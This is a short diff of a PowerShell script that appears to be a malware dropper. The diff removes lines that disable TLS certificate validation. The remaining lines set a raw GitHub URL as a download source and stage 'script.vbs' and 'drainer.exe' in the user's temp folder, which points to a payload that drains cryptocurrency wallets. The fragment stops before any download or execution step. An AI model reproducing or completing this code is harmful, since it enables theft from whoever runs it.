@@ -1,6 +1,3 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-
 $base = 'https://github.com/jesuss13377-source/456/raw/refs/heads/main/'
 $vbs = "$env:TEMP\script.vbs"
 $d1  = "$env:TEMP\drainer.exe"
